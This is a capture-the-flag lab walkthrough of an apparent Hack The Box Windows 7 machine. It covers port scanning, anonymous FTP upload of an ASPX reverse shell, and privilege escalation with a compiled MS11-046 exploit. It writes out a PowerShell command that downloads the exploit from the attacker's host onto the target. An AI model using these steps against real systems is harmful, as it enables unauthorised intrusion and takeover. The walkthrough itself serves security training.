# <u>1:Enumeration</u>

- scan top 1000 ports

```sql
nmap -sC -sV -oN nmap/initial 10.10.10.5
```

- the result

![1](/assets/images/htb/devel/1000.png)

- all ports scan

```sql
nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.5
```

- the result

![1](/assets/images/htb/devel/all_ports.png)

### <u>Open Ports</u>
- We all know both Nmap scan shows us, just 2 open ports
- 21/FTP = Microsoft ftpd
- 80/HTTP = Microsoft IIS httpd 7.5

## <u>FTP</u>
- File Transfer Protocol [FTP] on this machine is open and allowed login as anonymous
- Let's connect to it

![1](/assets/images/htb/devel/ftp.png)

- Well, I can't find anything on it
- So, I'm thinking this FTP might have been connected to the other port [port 80].

## <u>WebPage</u>
- As we saw the image above. It has a `welcome.png` image.
- Let's put that on the `URL`

![1](/assets/images/htb/devel/welcome.png)

- COOL!

# <u>2:Foothold/Gaining Access</u>

## <u>ASPX Reverse Shell</u>
- Let's try to get the reverse shell 
- So, this is `Microsoft IIS` 
- with light googling. I've found the [aspx reverse shell](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx)
- Source
	- [Github - borjmz](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx)
<br>
- I'm gonna put the reverse shell on the FTP server
- Then, execute it with the `curl` command

![1](/assets/images/htb/devel/got_shell.png)

- I'm in as `iis apppool\web`

## <u>systeminfo</u>

- Let's enumerate this machine.
- First, I'm gonna run the `systeminfo` command
- the result

![1](/assets/images/htb/devel/systeminfo.png)

- OK! WOW!
- we're on Microsoft Windows 7 and it's a really old machine.
- Again. I'm gonna google around.

# <u>3:Privilege Escalation</u>

## <u>MS11-046</u>

![1](/assets/images/htb/devel/exploit-db.png)

- I've found this exploit
- Let's download it and compile the exploit <br>
-> don't worry, they got the compiling instructions

### <u>Compiling Exploit</u>
> <font color="yellow">Note: </font> If you got this response after try to compiling `command not found: i686-w64-mingw32-gcc` <br>
> Just run this command to install  it`apt install mingw-w64` 

- This is the command for compiling
```bash
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
```
- After it is done, you got the binary in your directory called `MS11-046.exe`

### <u>Transfer the Exploit</u>
- Turns out, this machine has `PowerShell`
- I'm gonna host my file with a python webserver

```python
python3 -m http.server
```
- Let's transfer the exploit using PowerShell with this command.
- Source <br>

```powershell
powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/MS11-046.exe', 'c:\users\public\documents\lol.exe')"
```
- Then, execute it.

![1](/assets/images/htb/devel/exe.png)

- YES! I'm become `SYSTEM`

## <u>User Flag</u>

## <u>Administrator Flag</u>

# <u>4:Conclusion</u>
I've learned a lot today. If you using File Transfer Protocol [FTP] make sure to configure it properly and avoid using anonymous access. Lastly, just update the system or even better use the new and up-to-date version of windows.

I have a fun time doing this machine and I hope you guys do too. Bye ;)
